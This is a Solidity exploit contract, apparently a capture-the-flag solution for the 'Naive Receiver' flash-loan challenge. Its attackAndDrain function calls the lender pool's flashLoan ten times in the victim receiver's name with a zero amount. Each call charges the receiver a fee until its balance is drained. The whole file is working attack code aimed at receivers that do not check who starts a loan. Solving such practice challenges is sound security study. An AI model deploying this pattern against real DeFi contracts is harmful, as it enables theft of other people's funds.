// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "../naive-receiver/FlashLoanReceiver.sol";

contract AttackReciever{
    NaiveReceiverLenderPool public immutable lender;
    FlashLoanReceiver public immutable scammed_reciever;
    constructor(address payable lenderAddr, address payable recieverAddr){
        lender = NaiveReceiverLenderPool(lenderAddr);
        scammed_reciever = FlashLoanReceiver(recieverAddr);
    }

    function attackAndDrain() public{
        for (uint256 i = 0 ; i < 10; ++i){
            lender.flashLoan(address(scammed_reciever),0);
        }
    }
}